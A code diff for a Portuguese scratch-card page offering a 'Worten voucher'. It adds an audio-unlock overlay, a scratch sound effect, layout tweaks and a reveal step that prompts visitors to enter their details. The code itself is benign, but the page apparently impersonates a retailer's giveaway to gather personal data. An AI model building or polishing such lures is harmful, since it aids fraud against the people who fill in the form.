@@ -8,7 +8,9 @@
     <meta name="description" content="Resgate o seu voucher Worten">
     <link rel="stylesheet" href="style.css?v=24">
     <link rel="stylesheet" href="style.css?v=24">
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap"
+        rel="stylesheet">
     <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
     <style>
         body {
@@ -19,13 +21,21 @@
             position: relative;
             display: inline-block;
             width: 100%;
-            max-width: 320px;
+            max-width: 340px;
+            /* Slightly wider */
+            padding-bottom: 20px;
+            /* Visual Balance */
         }
 
         .voucher-img {
             width: 100%;
+            /* Taller Aspect Ratio via CSS */
+            height: auto;
+            min-height: 500px;
+            /* Force Taller Card */
+            object-fit: cover;
             border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
         }
 
         .voucher-value {
@@ -602,43 +612,100 @@
             };
 
             // --- Audio Logic (ASMR Scratch) ---
+            // --- Audio Logic (iOS Unlock Pattern) ---
             let audioCtx, gainNode, noiseSource;
             let audioInitialized = false;
+            let audioUnlocked = false;
             let audioTimeout;
 
+            // Global Overlay for iOS Unlock
+            const createUnlockOverlay = () => {
+                if (localStorage.getItem('audioUnlocked') === 'true') {
+                    // Try auto-resume if previously unlocked
+                    initAudio();
+                    return;
+                }
+
+                const overlay = document.createElement('div');
+                overlay.id = 'audio-unlock-overlay';
+                overlay.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+                    background: rgba(0,0,0,0.85); z-index: 9999;
+                    display: flex; flex-direction: column; align-items: center; justify-content: center;
+                    backdrop-filter: blur(5px); animation: fadeIn 0.3s ease;
+                `;
+                overlay.innerHTML = `
+                    <div style="background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 80%;">
+                        <div style="font-size: 40px; margin-bottom: 20px;">🔊</div>
+                        <h3 style="color: #333; margin-bottom: 10px;">Ativar Som</h3>
+                        <p style="color: #666; margin-bottom: 25px; font-size: 14px;">Para a melhor experiência, ative o som da raspadinha.</p>
+                        <button id="unlock-btn" style="
+                            background: #d32f2f; color: white; border: none; padding: 12px 30px;
+                            border-radius: 50px; font-weight: 700; font-size: 16px; cursor: pointer;
+                        ">ATIVAR AGORA</button>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+
+                document.getElementById('unlock-btn').addEventListener('click', () => {
+                    initAudio();
+                    if (audioCtx) {
+                        audioCtx.resume().then(() => {
+                            console.log('Audio Context Resumed/Unlocked');
+                            // Play silent buffer to force unlock
+                            const buffer = audioCtx.createBuffer(1, 1, 22050);
+                            const source = audioCtx.createBufferSource();
+                            source.buffer = buffer;
+                            source.connect(audioCtx.destination);
+                            source.start(0);
+
+                            audioUnlocked = true;
+                            localStorage.setItem('audioUnlocked', 'true');
+
+                            overlay.style.opacity = '0';
+                            setTimeout(() => overlay.remove(), 300);
+                        });
+                    }
+                });
+            };
+
             const initAudio = () => {
-                if (audioInitialized) return;
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 if (!AudioContext) return;
 
-                audioCtx = new AudioContext();
+                if (!audioCtx) audioCtx = new AudioContext(); // Singleton
 
-                const bufferSize = audioCtx.sampleRate;
-                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
-                const data = buffer.getChannelData(0);
-                for (let i = 0; i < bufferSize; i++) {
-                    data[i] = Math.random() * 2 - 1;
+                if (!noiseSource) {
+                    const bufferSize = audioCtx.sampleRate;
+                    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+                    const data = buffer.getChannelData(0);
+                    for (let i = 0; i < bufferSize; i++) {
+                        data[i] = Math.random() * 2 - 1;
+                    }
+
+                    noiseSource = audioCtx.createBufferSource();
+                    noiseSource.buffer = buffer;
+                    noiseSource.loop = true;
+
+                    const filter = audioCtx.createBiquadFilter();
+                    filter.type = 'lowpass';
+                    filter.frequency.value = 350;
+                    filter.Q.value = 1.0;
+
+                    gainNode = audioCtx.createGain();
+                    gainNode.gain.value = 0;
+
+                    noiseSource.connect(filter);
+                    filter.connect(gainNode);
+                    gainNode.connect(audioCtx.destination);
+
+                    noiseSource.start();
                 }
-
-                noiseSource = audioCtx.createBufferSource();
-                noiseSource.buffer = buffer;
-                noiseSource.loop = true;
-
-                const filter = audioCtx.createBiquadFilter();
-                filter.type = 'lowpass'; // Removes high-pitch hiss
-                filter.frequency.value = 350; // Muffled paper scratch
-                filter.Q.value = 1.0;
-
-                gainNode = audioCtx.createGain();
-                gainNode.gain.value = 0; // Start at 0
-
-                noiseSource.connect(filter);
-                filter.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-
-                noiseSource.start();
                 audioInitialized = true;
             };
+
+            // Call Unlock on Init
+            setTimeout(createUnlockOverlay, 500); // Small delay to play nice with load
 
             const playScratchSound = () => {
                 if (!audioCtx) initAudio();
@@ -704,13 +771,12 @@
 
                 // Update Text (Using visible instruction-text)
                 const textSpan = document.getElementById('instruction-text');
-                if (textSpan) textSpan.innerHTML = `RASPE PARA REVELAR O CÓDIGO <span style='font-weight:900; color:#d32f2f;'>(${Math.min(percent, 100)}%)</span>`;
+                if (textSpan) textSpan.innerHTML = `RASPE PARA REVELAR O CÓDIGO <span style='font-weight:900; color:#16a34a;'>(${Math.min(percent, 100)}%)</span>`;
 
                 if (!justUpdateText && percent > 45) { // Threshold
                     completed = true;
 
                     // Auto reveal animation
-                    // Animate canvas opacity out
                     const fadeOut = setInterval(() => {
                         const currentOp = parseFloat(canvas.style.opacity || 1);
                         if (currentOp > 0) {
@@ -726,6 +792,9 @@
                     text.innerHTML = "<div style='display:flex;align-items:center;justify-content:center;gap:10px;'><svg width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='#4CAF50' stroke-width='3' stroke-linecap='round' stroke-linejoin='round' style='filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3));'><polyline points='20 6 9 17 4 12'></polyline></svg> <span>CÓDIGO REVELADO</span></div><div style='font-size:14px; font-weight:400; margin-top:5px; opacity:0.9;'>Preencha os dados abaixo para ativar o envio</div>";
 
                     document.querySelector('.form-container').classList.add('visible');
+
+                    // Reveal font style tweak (Space Mono)
+                    document.getElementById('voucher-code-display').style.fontFamily = "'Space Mono', monospace";
 
                     // Scroll to form slightly
                     setTimeout(() => {
